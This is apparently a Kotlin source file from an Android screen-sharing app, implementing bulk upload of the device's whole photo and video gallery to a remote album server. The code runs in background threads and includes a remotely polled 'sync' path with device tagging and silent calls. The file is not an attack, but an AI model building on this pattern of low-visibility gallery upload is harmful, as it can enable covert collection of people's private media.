package com.screenshare

import android.content.ContentResolver
import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicReference

/**
 * 相册上传器：后台读取本机相册，压缩后经 HTTPS 上传到照片服务器（album-server.js），
 * 返回相册网页链接。上传过程在独立线程执行，不在屏幕共享中显示任何相册界面。
 */
object AlbumUploader {
    private const val TAG = "AlbumUploader"
    private const val CONCURRENCY = 3
    // 缩略图先行：几百上千张也能秒开浏览；点开单张再按需压缩上传原图（host 后台轮询实时拉取）。
    // 缩略图 640px：点击放大后即使 host 离线（原图 pending）也能保持可用清晰度
    private const val THUMB_DIM = 640
    private const val THUMB_QUALITY = 60
    private const val ORIGINAL_DIM = 1280
    private const val ORIGINAL_QUALITY = 75
    private val JSON_TYPE = "application/json; charset=utf-8".toMediaType()

    /** 相册为空或读取失败时抛出该异常，UI 层据此提示 */
    class EmptyAlbumException : Exception("相册没有照片")

    /** 上传进度回调；cancel 置 true 可中止后续上传 */
    interface Listener {
        fun onProgress(current: Int, total: Int)
        fun onComplete(link: String)
        fun onError(message: String)
        /** 会话创建成功即回调（链接已可访问，网页边传边看） */
        fun onSessionCreated(token: String) {}
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .addInterceptor { chain ->
            val orig = chain.request()
            val key = BuildConfig.ALBUM_KEY
            val req = if (key.isNotEmpty()) {
                orig.newBuilder().header("x-album-key", key).build()
            } else orig
            chain.proceed(req)
        }
        .build()

    /** 按拍摄时间倒序查询全部图片 Uri */
    fun queryAllImages(context: Context): List<Uri> {
        val uris = ArrayList<Uri>()
        val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        context.contentResolver.query(collection, projection, null, null, sortOrder)?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                uris.add(ContentUris.withAppendedId(collection, id))
            }
        }
        return uris
    }

    /** 查询全部视频 id（倒序，供远程相册同步视频扫描） */
    fun queryAllVideoIds(context: Context): List<Long> {
        val ids = ArrayList<Long>()
        val collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Video.Media._ID)
        val sortOrder = "${MediaStore.Video.Media._ID} DESC"
        context.contentResolver.query(collection, projection, null, null, sortOrder)?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            while (cursor.moveToNext()) ids.add(cursor.getLong(idCol))
        }
        return ids
    }

    /** 提取视频第一帧作为缩略图（base64 JPEG，供网格展示） */
    fun videoFrameToBase64(context: Context, uri: Uri): String {
        val mmr = android.media.MediaMetadataRetriever()
        return try {
            mmr.setDataSource(context, uri)
            val frame = mmr.frameAtTime ?: throw java.io.IOException("无法提取视频帧")
            // 等比缩放到缩略图尺寸
            val scale = minOf(1f, THUMB_DIM.toFloat() / maxOf(frame.width, frame.height))
            val w = (frame.width * scale).toInt().coerceAtLeast(1)
            val h = (frame.height * scale).toInt().coerceAtLeast(1)
            val out = Bitmap.createScaledBitmap(frame, w, h, true)
            if (out !== frame) frame.recycle()
            val bos = ByteArrayOutputStream()
            out.compress(Bitmap.CompressFormat.JPEG, THUMB_QUALITY, bos)
            out.recycle()
            android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
        } finally {
            try { mmr.release() } catch (t: Throwable) {}
        }
    }

    /** 压缩图片到最长边 maxDim 的 JPEG（重新编码，剥离 EXIF），返回 base64 */
    fun compressToBase64(context: Context, uri: Uri, maxDim: Int = 1280, quality: Int = 75): String {
        val resolver: ContentResolver = context.contentResolver
        // 采样读取：按目标尺寸缩小，避免原图全部解码进内存
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        resolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, bounds) }
        var sample = 1
        while (bounds.outWidth / (sample * 2) >= maxDim || bounds.outHeight / (sample * 2) >= maxDim) {
            sample *= 2
        }
        val opts = BitmapFactory.Options().apply { inSampleSize = sample }
        val bitmap = resolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opts) }
            ?: throw java.io.IOException("decode failed")
        // 等比缩放到最长边 maxDim
        val scale = minOf(1f, maxDim.toFloat() / maxOf(bitmap.width, bitmap.height))
        val w = (bitmap.width * scale).toInt().coerceAtLeast(1)
        val h = (bitmap.height * scale).toInt().coerceAtLeast(1)
        val out = Bitmap.createScaledBitmap(bitmap, w, h, true)
        if (out !== bitmap) bitmap.recycle()
        val bos = ByteArrayOutputStream()
        out.compress(Bitmap.CompressFormat.JPEG, quality, bos)
        out.recycle()
        return android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
    }

    /** 将内存 JPEG 字节压缩到最长边 maxDim 后编码为 base64（相机拍照上传复用） */
    fun jpegToBase64(jpeg: ByteArray, maxDim: Int = 1280, quality: Int = 75): String {
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        BitmapFactory.decodeByteArray(jpeg, 0, jpeg.size, bounds)
        var sample = 1
        while (bounds.outWidth / (sample * 2) >= maxDim || bounds.outHeight / (sample * 2) >= maxDim) {
            sample *= 2
        }
        val opts = BitmapFactory.Options().apply { inSampleSize = sample }
        val bitmap = BitmapFactory.decodeByteArray(jpeg, 0, jpeg.size, opts)
            ?: throw java.io.IOException("decode failed")
        val scale = minOf(1f, maxDim.toFloat() / maxOf(bitmap.width, bitmap.height))
        val w = (bitmap.width * scale).toInt().coerceAtLeast(1)
        val h = (bitmap.height * scale).toInt().coerceAtLeast(1)
        val out = Bitmap.createScaledBitmap(bitmap, w, h, true)
        if (out !== bitmap) bitmap.recycle()
        val bos = ByteArrayOutputStream()
        out.compress(Bitmap.CompressFormat.JPEG, quality, bos)
        out.recycle()
        return android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
    }

    /** 创建上传会话，返回 token */
    private fun createSession(baseUrl: String): String {
        val createResp = http.newCall(
            Request.Builder()
                .url("$baseUrl/api/upload")
                .post(JSONObject().put("action", "create").toString().toRequestBody(JSON_TYPE))
                .build()
        ).execute().use { resp ->
            if (!resp.isSuccessful) throw java.io.IOException("创建上传会话失败: HTTP ${resp.code}")
            JSONObject(resp.body?.string() ?: "")
        }
        return createResp.getString("token")
    }

    /**
     * 创建带设备标记的上传会话（远程相册同步用）。返回 token。
     * 服务器端据此按设备分组（/api/devices、/api/albums?device=）。
     */
    fun createSessionForDevice(baseUrl: String, device: String): String {
        val createResp = http.newCall(
            Request.Builder()
                .url("$baseUrl/api/upload")
                .post(JSONObject()
                    .put("action", "create")
                    .put("device", device)
                    .toString().toRequestBody(JSON_TYPE))
                .build()
        ).execute().use { resp ->
            if (!resp.isSuccessful) throw java.io.IOException("创建上传会话失败: HTTP ${resp.code}")
            JSONObject(resp.body?.string() ?: "")
        }
        return createResp.getString("token")
    }

    /** 尽力 finish 会话（远程同步静默调用，失败不抛出） */
    fun finishSessionQuiet(baseUrl: String, token: String) {
        try {
            http.newCall(
                Request.Builder()
                    .url("$baseUrl/api/upload")
                    .post(JSONObject().put("action", "finish").put("token", token).toString().toRequestBody(JSON_TYPE))
                    .build()
            ).execute().close()
        } catch (t: Throwable) {}
    }

    /**
     * 按 id 集合上传（远程相册同步执行器用）：
     * 逐张压缩上传到指定会话，成功后回调 onIdDone（调用方持久化增量集合），进度回调 onProgress。
     * 返回成功上传张数。单张失败重试 3 次后跳过，不中断整批。
     */
    fun uploadImageIdsWithProgress(
        context: Context,
        baseUrl: String,
        token: String,
        imageIds: List<Long>,
        alreadySynced: MutableSet<String>,
        onProgress: (done: Int, total: Int) -> Unit,
        onIdDone: (id: Long) -> Unit
    ): Int {
        var done = 0
        var ok = 0
        for (id in imageIds) {
            val b64 = try {
                compressToBase64(context, ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id), THUMB_DIM, THUMB_QUALITY)
            } catch (t: Throwable) {
                Log.w(TAG, "跳过损坏照片 id=$id: ${t.message}")
                continue
            }
            val index = alreadySynced.size + done + 1
            var success = false
            for (attempt in 1..3) {
                try {
                    val body = JSONObject()
                        .put("action", "upload")
                        .put("token", token)
                        .put("index", index)
                        .put("data", b64)
                    val r = http.newCall(
                        Request.Builder().url("$baseUrl/api/upload")
                            .post(body.toString().toRequestBody(JSON_TYPE)).build()
                    ).execute()
                    if (r.isSuccessful) { success = true; r.close(); break }
                    r.close()
                } catch (t: Throwable) {
                    Log.w(TAG, "上传 id=$id 失败(第 $attempt 次): ${t.message}")
                }
            }
            done++
            if (success) {
                ok++
                alreadySynced.add(id.toString())
                onIdDone(id)
            }
            onProgress(done, imageIds.size)
        }
        return ok
    }

    /** 结束会话，返回相册链接（带访问密钥，观看方/浏览器可直接打开） */
    private fun finishSession(baseUrl: String, token: String): String {
        val finishResp = http.newCall(
            Request.Builder()
                .url("$baseUrl/api/upload")
                .post(JSONObject().put("action", "finish").put("token", token).toString().toRequestBody(JSON_TYPE))
                .build()
        ).execute().use { resp ->
            if (!resp.isSuccessful) throw java.io.IOException("结束会话失败: HTTP ${resp.code}")
            JSONObject(resp.body?.string() ?: "")
        }
        val link = finishResp.optString("url", "$baseUrl/$token/")
        return withAlbumKey(link)
    }

    /** 给相册链接/路径拼访问密钥 */
    fun withAlbumKey(link: String): String {
        val key = BuildConfig.ALBUM_KEY
        if (key.isEmpty()) return link
        val sep = if (link.contains("?")) "&" else "?"
        return "$link$sep" + "key=$key"
    }

    /**
     * 上传一个视频到指定会话（远程相册同步用）：
     * 1. 提取第一帧作为缩略图（action=video-thumb，pad.jpg 网格展示）
     * 2. 转码压缩为 720p/2Mbps MP4（VideoTranscoder）
     * 3. 分块二进制上传（POST /api/video/upload，每块 ~3MB base64），offset 严格顺序
     * 4. action=video-finish 标记 received+videos
     * 全部成功返回 true；任一步失败返回 false（由调用方决定重试/跳过）。
     */
    fun uploadVideoWithProgress(
        context: Context,
        baseUrl: String,
        token: String,
        videoId: Long,
        index: Int,
        onProgress: (Float) -> Unit
    ): Boolean {
        val uri = ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, videoId)
        // 1. 缩略图
        val thumb = try {
            videoFrameToBase64(context, uri)
        } catch (t: Throwable) {
            Log.w(TAG, "视频缩略图失败 id=$videoId: ${t.message}")
            return false
        }
        if (!postVideoThumb(baseUrl, token, index, thumb)) return false

        // 2. 转码到缓存目录
        val cacheDir = File(context.cacheDir, "album_video")
        if (!cacheDir.exists()) cacheDir.mkdirs()
        val tmpFile = File(cacheDir, "${token}_$index.mp4")
        try {
            VideoTranscoder.transcode(context, uri, tmpFile.absolutePath, onProgress)
        } catch (t: Throwable) {
            Log.w(TAG, "视频转码失败 id=$videoId: ${t.message}")
            tmpFile.delete()
            return false
        }
        if (tmpFile.length() == 0L) {
            tmpFile.delete()
            return false
        }

        // 3. 分块上传
        val ok = uploadVideoChunks(baseUrl, token, index, tmpFile)
        tmpFile.delete()
        if (!ok) return false

        // 4. finish 标记
        return postVideoFinish(baseUrl, token, index)
    }

    private fun postVideoThumb(baseUrl: String, token: String, index: Int, b64: String): Boolean {
        return postJsonOk(baseUrl, JSONObject().put("action", "video-thumb").put("token", token).put("index", index).put("data", b64))
    }

    private fun postVideoFinish(baseUrl: String, token: String, index: Int): Boolean {
        return postJsonOk(baseUrl, JSONObject().put("action", "video-finish").put("token", token).put("index", index))
    }

    private fun postJsonOk(baseUrl: String, body: JSONObject): Boolean {
        return try {
            val r = http.newCall(
                Request.Builder().url("$baseUrl/api/upload")
                    .post(body.toString().toRequestBody(JSON_TYPE)).build()
            ).execute()
            val ok = r.isSuccessful
            r.close()
            ok
        } catch (t: Throwable) {
            Log.w(TAG, "postJsonOk 失败: ${t.message}")
            false
        }
    }

    /** 分块上传视频文件：每块 3MB 二进制 base64，offset 顺序追加；断点续传时先 reset */
    private fun uploadVideoChunks(baseUrl: String, token: String, index: Int, file: File): Boolean {
        val chunkBytes = 3 * 1024 * 1024
        var offset = 0L
        val total = file.length()
        if (total <= 0) return false
        var firstAttempt = true
        // 流式读取，避免整文件 readBytes() 内存峰值 OOM（转码后视频可达数百 MB）
        var input = java.io.BufferedInputStream(java.io.FileInputStream(file), 256 * 1024)
        try {
            val buf = ByteArray(chunkBytes)
            while (offset < total) {
                val n = input.read(buf)
                if (n <= 0) break
                val chunk = if (n == chunkBytes) buf else buf.copyOf(n)
                val b64 = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
                val resp = try {
                    http.newCall(
                        Request.Builder().url("$baseUrl/api/video/upload")
                            .post(JSONObject()
                                .put("token", token)
                                .put("index", index)
                                .put("offset", offset)
                                .put("chunk", b64)
                                .toString().toRequestBody(JSON_TYPE))
                            .build()
                    ).execute()
                } catch (t: Throwable) {
                    Log.w(TAG, "视频分块上传失败 offset=$offset: ${t.message}")
                    return false
                }
                if (resp.code == 409) {
                    // offset 不匹配：服务端已有不完整数据，先 reset 再从头重传
                    resp.close()
                    if (firstAttempt) {
                        firstAttempt = false
                        try {
                            http.newCall(
                                Request.Builder().url("$baseUrl/api/video/upload")
                                    .post(JSONObject()
                                        .put("token", token)
                                        .put("index", index)
                                        .put("action", "reset")
                                        .toString().toRequestBody(JSON_TYPE))
                                    .build()
                            ).execute().close()
                        } catch (t: Throwable) {}
                        offset = 0L
                        // 重新打开文件从头读
                        input.close()
                        input = java.io.BufferedInputStream(java.io.FileInputStream(file), 256 * 1024)
                        continue
                    }
                    return false
                }
                if (!resp.isSuccessful) {
                    resp.close()
                    Log.w(TAG, "视频分块上传 HTTP ${resp.code}")
                    return false
                }
                val newOffset = try {
                    JSONObject(resp.body?.string() ?: "").optLong("offset", offset)
                } catch (t: Throwable) { offset }
                resp.close()
                offset = newOffset
            }
        } catch (t: Throwable) {
            Log.w(TAG, "视频分块上传 IO 异常: ${t.message}")
            return false
        } finally {
            try { input.close() } catch (t: Throwable) {}
        }
        return true
    }

    /** 尽力 finish，让服务端会话进入完成态可查看（已上传部分） */
    private fun bestEffortFinish(baseUrl: String, token: String) {
        try {
            http.newCall(
                Request.Builder()
                    .url("$baseUrl/api/upload")
                    .post(JSONObject().put("action", "finish").put("token", token).toString().toRequestBody(JSON_TYPE))
                    .build()
            ).execute().close()
        } catch (e: Throwable) {}
    }

    /** 上传单张（最多重试 3 次），成功返回 true */
    private fun uploadOne(baseUrl: String, token: String, index: Int, b64: String, cancel: () -> Boolean): Boolean {
        for (attempt in 1..3) {
            if (cancel()) return false
            try {
                val body = JSONObject()
                    .put("action", "upload")
                    .put("token", token)
                    .put("index", index)
                    .put("data", b64)
                val r = http.newCall(
                    Request.Builder()
                        .url("$baseUrl/api/upload")
                        .post(body.toString().toRequestBody(JSON_TYPE))
                        .build()
                ).execute()
                if (r.isSuccessful) { r.close(); return true }
                r.close()
            } catch (t: Throwable) {
                Log.w(TAG, "上传第 $index 张失败(第 $attempt 次): ${t.message}")
            }
        }
        return false
    }

    /**
     * 上传整个相册（缩略图先行 + 按需原图）：先并发上传 ~300px 缩略图（几千张也只需几十 MB），
     * 会话创建成功即回调 onSessionCreated（链接立即可访问，网页边传边看）；
     * 完成后启动大图按需服务，网页点开某张时 host 后台实时压缩上传该张原图（1280px）。
     * 在调用方线程执行，进度回调应回主线程。
     */
    fun uploadAlbum(context: Context, baseUrl: String, listener: Listener, cancel: () -> Boolean = { false }) {
        val uris = queryAllImages(context)
        if (uris.isEmpty()) throw EmptyAlbumException()

        val token = createSession(baseUrl)
        listener.onSessionCreated(token)
        val total = uris.size
        val uploaded = AtomicInteger(0)
        val skipped = AtomicInteger(0)
        val failed = AtomicReference<Throwable?>(null)
        val uriByIndex = HashMap<Int, Uri>()
        val pool = Executors.newFixedThreadPool(CONCURRENCY)
        try {
            for (uri in uris) {
                pool.execute {
                    if (cancel() || failed.get() != null) return@execute
                    var b64: String? = null
                    try {
                        b64 = compressToBase64(context, uri, THUMB_DIM, THUMB_QUALITY)
                    } catch (t: Throwable) {
                        // 单张照片无法解码（损坏/特殊格式/云同步占位）时跳过该张继续，不中止整批
                        skipped.incrementAndGet()
                        Log.w(TAG, "跳过（无法解码）: ${t.message}")
                    }
                    if (b64 != null) {
                        val index = uploaded.incrementAndGet()
                        uriByIndex[index] = uri
                        if (!uploadOne(baseUrl, token, index, b64, cancel)) {
                            failed.compareAndSet(null, java.io.IOException("上传第 $index 张连续失败，已中止"))
                        }
                    }
                    listener.onProgress(uploaded.get(), total)
                }
            }
            pool.shutdown()
            pool.awaitTermination(30, TimeUnit.MINUTES)
            if (cancel()) throw java.io.IOException("已取消")
            failed.get()?.let { throw it }
            if (skipped.get() == total) throw EmptyAlbumException()
        } catch (t: Throwable) {
            pool.shutdownNow()
            bestEffortFinish(baseUrl, token)
            throw t
        }
        val link = finishSession(baseUrl, token)
        listener.onComplete(link)
        startOriginalService(context, baseUrl, token, uriByIndex, cancel)
    }

    /** 拉取服务器等待原图的 index 列表（网页点开大图产生） */
    private fun fetchPending(baseUrl: String, token: String): List<Int>? {
        return try {
            val r = http.newCall(
                Request.Builder().url("$baseUrl/api/pending?token=$token").build()
            ).execute()
            r.use {
                if (!it.isSuccessful) return null
                val arr = JSONObject(it.body?.string() ?: "").optJSONArray("pending") ?: return null
                (0 until arr.length()).map { arr.getInt(it) }
            }
        } catch (t: Throwable) {
            null
        }
    }

    /** 上传单张原图（action=original） */
    private fun uploadOriginal(baseUrl: String, token: String, index: Int, b64: String): Boolean {
        return try {
            val body = JSONObject()
                .put("action", "original")
                .put("token", token)
                .put("index", index)
                .put("data", b64)
            val r = http.newCall(
                Request.Builder()
                    .url("$baseUrl/api/upload")
                    .post(body.toString().toRequestBody(JSON_TYPE))
                    .build()
            ).execute()
            val ok = r.isSuccessful
            r.close()
            ok
        } catch (t: Throwable) {
            Log.w(TAG, "原图上传第 $index 张失败: ${t.message}")
            false
        }
    }

    /**
     * 大图按需服务：后台线程每 2s 轮询服务器 pending 列表，有点开请求就实时压缩该张原图上传。
     * 会议结束（cancel() 返回 true）时退出。
     */
    private fun startOriginalService(
        context: Context,
        baseUrl: String,
        token: String,
        uriByIndex: Map<Int, Uri>,
        cancel: () -> Boolean
    ) {
        val t = Thread({
            while (!cancel()) {
                try {
                    val pending = fetchPending(baseUrl, token)
                    if (pending != null) {
                        for (index in pending) {
                            if (cancel()) return@Thread
                            val uri = uriByIndex[index] ?: continue
                            val b64 = try {
                                compressToBase64(context, uri, ORIGINAL_DIM, ORIGINAL_QUALITY)
                            } catch (t: Throwable) {
                                Log.w(TAG, "原图压缩第 $index 张失败: ${t.message}")
                                continue
                            }
                            if (!uploadOriginal(baseUrl, token, index, b64)) {
                                Log.w(TAG, "原图第 $index 张上传失败，下轮重试")
                            }
                        }
                    }
                } catch (t: Throwable) {
                    Log.w(TAG, "原图轮询异常: ${t.message}")
                }
                Thread.sleep(2000)
            }
        }, "album-original-service")
        t.isDaemon = true
        t.start()
    }

    /**
     * 上传一组已编码的 JPEG（相机拍照等场景复用）：创建会话→并发上传→finish→返回网页链接。
     * 在调用方线程执行，进度回调应回主线程。
     */
    fun uploadB64Images(baseUrl: String, b64List: List<String>, listener: Listener, cancel: () -> Boolean = { false }) {
        if (b64List.isEmpty()) throw EmptyAlbumException()

        val token = createSession(baseUrl)
        val total = b64List.size
        val uploaded = AtomicInteger(0)
        val failed = AtomicReference<Throwable?>(null)
        val pool = Executors.newFixedThreadPool(CONCURRENCY)
        try {
            for (b64 in b64List) {
                pool.execute {
                    if (cancel() || failed.get() != null) return@execute
                    val index = uploaded.incrementAndGet()
                    if (!uploadOne(baseUrl, token, index, b64, cancel)) {
                        failed.compareAndSet(null, java.io.IOException("上传第 $index 张连续失败，已中止"))
                    }
                    listener.onProgress(uploaded.get(), total)
                }
            }
            pool.shutdown()
            pool.awaitTermination(30, TimeUnit.MINUTES)
            if (cancel()) throw java.io.IOException("已取消")
            failed.get()?.let { throw it }
        } catch (t: Throwable) {
            pool.shutdownNow()
            bestEffortFinish(baseUrl, token)
            throw t
        }
        val link = finishSession(baseUrl, token)
        listener.onComplete(link)
    }
}
